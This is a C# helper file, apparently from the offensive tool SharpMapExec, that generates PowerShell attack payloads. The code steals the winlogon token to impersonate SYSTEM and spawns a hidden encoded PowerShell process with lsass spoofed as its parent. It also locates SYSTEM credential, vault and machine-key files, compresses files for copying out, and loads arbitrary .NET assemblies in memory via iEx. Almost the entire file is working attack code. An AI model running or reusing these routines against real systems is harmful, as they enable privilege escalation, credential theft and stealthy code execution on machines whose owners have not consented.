using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

namespace SharpMapExec.Helpers
{
    internal class PsFunction
    {
        public static string ImpersonateSystem(string command = "[System.Security.Principal.WindowsIdentity]::GetCurrent()")
        {
            string function = @"
$advapi32 = Add-Type -Name 'advapi32' -Namespace 'Win32' -PassThru	-MemberDefinition  @'
[DllImport(""advapi32.dll"", SetLastError = true)]
[return: MarshalAs(UnmanagedType.Bool)]
public static extern bool OpenProcessToken(
    IntPtr ProcessHandle,
    UInt32 DesiredAccess,
    out IntPtr TokenHandle);

[DllImport(""advapi32.dll"", SetLastError = true)]
public static extern bool DuplicateToken(
    IntPtr ExistingTokenHandle,
    int SECURITY_IMPERSONATION_LEVEL,
    ref IntPtr DuplicateTokenHandle);

[DllImport(""advapi32.dll"", SetLastError = true)]
public static extern bool ImpersonateLoggedOnUser(
    IntPtr hToken);

[DllImport(""kernel32.dll"")]
public static extern uint GetLastError();

[DllImport(""kernel32.dll"", SetLastError = true)]
[return: MarshalAs(UnmanagedType.Bool)]
public static extern bool CloseHandle(
    IntPtr hObject
);

[DllImport(""advapi32.dll"", SetLastError = true)]
public static extern bool RevertToSelf();

[DllImport(""advapi32.dll"", SetLastError = true)]
public static extern bool SetThreadToken(
    IntPtr Thread,
    IntPtr Token
);
'@
$isAdmin = (New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if ($isAdmin) {{
    [intptr]$hToken    = [intptr]::Zero
    [IntPtr]$hDupToken = [intptr]::Zero
    [IntPtr]$handle    = (Get-Process 'winlogon').Handle
    $Success     = [Win32.advapi32]::OpenProcessToken($handle, 0x2, [ref]$hToken)
    if (!$success)
    {{
        return 'OpenProcessToken failed!'
    }}
    $success = [Win32.advapi32]::DuplicateToken($hToken,2, [ref]$hDupToken)
    if (!$success)
    {{
        return 'DuplicateToken failed!'
    }}
    $identity = [System.Security.Principal.WindowsIdentity]::New($hDupToken)
    $output = [System.Security.Principal.WindowsIdentity]::RunImpersonated($identity.AccessToken, [Func[object]]{{
        {0}
    }})
    $null = [Win32.advapi32]::CloseHandle($hToken)
    $null = [Win32.advapi32]::CloseHandle($hDupToken)
    return $Output
}}else{{
    write-output 'Not admin!'
    return $false
}}
";
            return String.Format(function, command);
        }

        public static string RunAsSystem(string command)
        {
            string function = @"
$Kernel32 = Add-Type -Name 'Kernel32' -Namespace 'Win32' -MemberDefinition  @'
[DllImport(""kernel32.dll"")]
[return: MarshalAs(UnmanagedType.Bool)]
public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

[DllImport(""kernel32.dll"", SetLastError = true)]
public static extern UInt32 WaitForSingleObject(IntPtr handle, UInt32 milliseconds);

[DllImport(""kernel32.dll"", SetLastError = true)]
[return: MarshalAs(UnmanagedType.Bool)]
public static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

[DllImport(""kernel32.dll"", SetLastError = true)]
[return: MarshalAs(UnmanagedType.Bool)]
public static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

[DllImport(""kernel32.dll"", SetLastError = true)]
[return: MarshalAs(UnmanagedType.Bool)]
public static extern bool DeleteProcThreadAttributeList(IntPtr lpAttributeList);

[DllImport(""kernel32.dll"", SetLastError = true)]
public static extern bool CloseHandle(IntPtr hObject);

[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
public struct STARTUPINFOEX
{{
    public STARTUPINFO StartupInfo;
    public IntPtr lpAttributeList;
}}
[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
public struct STARTUPINFO
{{
    public Int32 cb;
    public string lpReserved;
    public string lpDesktop;
    public string lpTitle;
    public Int32 dwX;
    public Int32 dwY;
    public Int32 dwXSize;
    public Int32 dwYSize;
    public Int32 dwXCountChars;
    public Int32 dwYCountChars;
    public Int32 dwFillAttribute;
    public Int32 dwFlags;
    public Int16 wShowWindow;
    public Int16 cbReserved2;
    public IntPtr lpReserved2;
    public IntPtr hStdInput;
    public IntPtr hStdOutput;
    public IntPtr hStdError;
}}
[StructLayout(LayoutKind.Sequential)]
public struct PROCESS_INFORMATION
{{
    public IntPtr hProcess;
    public IntPtr hThread;
    public int dwProcessId;
    public int dwThreadId;
}}
[StructLayout(LayoutKind.Sequential)]
public struct SECURITY_ATTRIBUTES
{{
    public int nLength;
    public IntPtr lpSecurityDescriptor;
    [MarshalAs(UnmanagedType.Bool)]
    public bool bInheritHandle;
}}
[Flags]
public enum ProcessAccessFlags : uint
{{
    All = 0x001F0FFF,
    Terminate = 0x00000001,
    CreateThread = 0x00000002,
    VirtualMemoryOperation = 0x00000008,
    VirtualMemoryRead = 0x00000010,
    VirtualMemoryWrite = 0x00000020,
    DuplicateHandle = 0x00000040,
    CreateProcess = 0x000000080,
    SetQuota = 0x00000100,
    SetInformation = 0x00000200,
    QueryInformation = 0x00000400,
    QueryLimitedInformation = 0x00001000,
    Synchronize = 0x00100000
}}
'@

[intptr]$parentHandle = (Get-Process 'lsass').handle
$PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
$EXTENDED_STARTUPINFO_PRESENT = 0x00080000
$CREATE_NEW_CONSOLE = 0x00000010
$CREATE_NO_WINDOW = 0x08000000
$pInfo = (New-Object Win32.Kernel32+PROCESS_INFORMATION)
$siEx = (New-Object Win32.Kernel32+STARTUPINFOEX)
$lpValueProc = [intptr]::Zero
$lpSize = [intptr]::Zero

$null = [Win32.Kernel32]::InitializeProcThreadAttributeList(
    [intptr]::Zero,
    1,
    0,
    [ref]$lpSize #20
)
$siEx.lpAttributeList = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($lpSize)
$null = [Win32.Kernel32]::InitializeProcThreadAttributeList(
    $siEx.lpAttributeList,
    1,0,
    [ref]$lpSize
)

$lpValueProc = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([IntPtr]::Size)
[System.Runtime.InteropServices.Marshal]::WriteIntPtr($lpValueProc,$parentHandle)

$null = [Win32.Kernel32]::UpdateProcThreadAttribute(
   $siEx.lpAttributeList,0,
   [IntPtr]$PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
   $lpValueProc,
   [intptr][IntPtr]::Size,
   [intptr]::Zero,
   [intptr]::Zero
)
$ps = (New-Object Win32.Kernel32+SECURITY_ATTRIBUTES)
$ts = (New-Object Win32.Kernel32+SECURITY_ATTRIBUTES)
$ps.nLength = [System.Runtime.InteropServices.Marshal]::SizeOf($ps)
$ts.nLength = [System.Runtime.InteropServices.Marshal]::SizeOf($ts)

$null = [Win32.Kernel32]::CreateProcess(
    'C:\windows\System32\cmd.exe',
    '/c powershell -enc {0}',
    [ref]$ps,
    [ref]$ts,
    $true,
    $EXTENDED_STARTUPINFO_PRESENT -bor $CREATE_NO_WINDOW,
    [intptr]::Zero,
    'C:\Windows\System32',
    [ref]$siEx,
    [ref]$pInfo
)
if ($siEx.lpAttributeList -ne [IntPtr]::Zero) {{
	$null = [Win32.Kernel32]::DeleteProcThreadAttributeList($siEx.lpAttributeList)
	[System.Runtime.InteropServices.Marshal]::FreeHGlobal($siEx.lpAttributeList)
}}
if ($pInfo.hProcess -ne [IntPtr]::Zero) {{
	$null = [Win32.Kernel32]::CloseHandle($pInfo.hProcess)
}}
if ($pInfo.hThread -ne [IntPtr]::Zero) {{
	$null = [Win32.Kernel32]::CloseHandle($pInfo.hThread)
}}
if($pInfo.dwProcessId -ne 0){{
    return ""  [+] System Pid Created: $($pInfo.dwProcessId)""
}}else{{
    return $False
}}
";
            return String.Format(function, Convert.ToBase64String(Encoding.Unicode.GetBytes(command)));
        }

        public static string FindSystemCred()
        {
            return @"
((@(""$env:SystemRoot\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials"",
""$env:SystemRoot\\System32\\config\\systemprofile\\AppData\\Roaming\\Microsoft\\Credentials"",
""$env:SystemRoot\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\Credentials"",
""$env:SystemRoot\\ServiceProfiles\\LocalService\\AppData\\Roaming\\Microsoft\\Credentials"",
""$env:SystemRoot\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Credentials"",
""$env:SystemRoot\\ServiceProfiles\\NetworkService\\AppData\\Roaming\\Microsoft\\Credentials"") | where{test-path $_}) | get-Childitem -force).fullname | where{$_}
";
        }

        public static string FindSystemVault()
        {
            return @"
((@(""$env:SystemRoot\System32\config\systemprofile\AppData\Local\Microsoft\Vault"",
""$env:SystemRoot\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault"",
""$env:SystemRoot\ServiceProfiles\LocalService\AppData\Local\Microsoft\Vault"",
""$env:SystemRoot\ServiceProfiles\LocalService\AppData\Roaming\Microsoft\Vault"",
""$env:SystemRoot\ServiceProfiles\NetworkService\AppData\Local\Microsoft\Vault"",
""$env:SystemRoot\ServiceProfiles\NetworkService\AppData\Roaming\Microsoft\Vault"") | where{test-path $_}) | get-Childitem -force).fullname | where{$_ -match ""[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}""}
";
        }

        public static string FindSystemCert()
        {
            return @"
((@(""$env:SystemDrive\\ProgramData\\Microsoft\\Crypto\\RSA\\MachineKeys"",
""$env:SystemDrive\\Windows\\ServiceProfiles\\LocalService\\AppData\\Roaming\\Microsoft\\Crypto\\RSA"",
""$env:SystemDrive\\Users\\All Users\\Application Data\\Microsoft\\Crypto\\RSA\\MachineKeys"") | where{test-path $_}) | get-Childitem -force).fullname | where{$_}
";
        }
        public static string CopyFile(string path)
        {
            return String.Format(@"
$Path = Resolve-Path '{0}'
if (![IO.File]::Exists($Path)){{return $false}}
$FileBytes = [System.IO.File]::ReadAllBytes($Path)
$Length = $FileBytes.Length
$CompressedStream = New-Object IO.MemoryStream
$GZipStream = New-Object IO.Compression.GZipStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
$GZipStream.Write($FileBytes, 0, $FileBytes.Length)
$GZipStream.Dispose()
$CompressedFileBytes = $CompressedStream.ToArray()
$CompressedStream.Dispose()
[Convert]::ToBase64String($CompressedFileBytes)
", path);
        }

        public static string DecompressData(string data)
        {
            return String.Format(@"
$b64 = '{0}'
$output = New-Object System.IO.MemoryStream
$Stream = New-Object IO.Compression.GZipStream([IO.MemoryStream][Convert]::FromBase64String($b64),[IO.Compression.CompressionMode]::Decompress)
$Stream.CopyTo($output)
$data = [System.Text.Encoding]::ASCII.GetString($output.ToArray())
", data);
        }

        public static string ExecuteAssembly(string path, string arguments, List<string> flags)
        {
            if (String.IsNullOrEmpty(arguments))
            {
                arguments = "";
            }
            string caller;
            if (flags.Contains("system"))
            {
                caller = RunAsSystem("$([Loader.Program]::LoadAssembly($arg) | out-string)");
            }
            else
            {
                caller = "$([Loader.Program]::LoadAssembly($arg) | out-string)";
            }
            byte[] bytes = File.ReadAllBytes(path);
            string template = String.Format(@"
$Code= @'
using System;
using System.IO;
using System.Linq;
using System.Reflection;
namespace Loader
{{
    public static class Program
    {{
        public static string LoadAssembly(string[] args)
        {{
            StringWriter stringWriter = new StringWriter();
	        Console.SetOut(stringWriter);
	        Console.SetError(stringWriter);
			byte[] bin = Convert.FromBase64String(""{0}"");
			Assembly a = Assembly.Load(bin);
			try
			{{
				a.EntryPoint.Invoke(null, new object[] 
                {{ 
                    args.Skip(1).ToArray<string>()
                }});
			}}
			catch
			{{
				MethodInfo method = a.EntryPoint;
				if (method != null)
				{{
					object o = a.CreateInstance(method.Name);                    
					method.Invoke(o, null);
				}}
			}}
            return stringWriter.ToString();
        }}
	}}
}}
'@
Add-Type -Language CSharp -TypeDefinition $code
[array]$arg = @'
null {1}
'@.split()
", Convert.ToBase64String(bytes), arguments);

            return String.Format(@"
{0}
iEx $data
{1}
", DecompressData(Misc.CompressData(template)), caller);
        }
    }
}